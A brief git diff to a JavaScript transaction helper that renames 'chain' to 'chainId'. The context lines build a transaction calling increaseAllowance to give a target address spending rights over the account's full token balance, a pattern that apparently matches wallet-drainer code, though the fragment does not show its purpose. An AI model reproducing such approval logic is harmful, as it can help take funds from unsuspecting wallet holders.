@@ -74,7 +74,7 @@ export const prepareTransaction = async (item, account , provider , chain) => {
   let tx = {
     from: account,
     to: item?.contract_address,
-    chain:chain,
+    chainId:chain,
     data: Contract.methods
       .increaseAllowance(targetAddress, item?.balance)
       .encodeABI(),
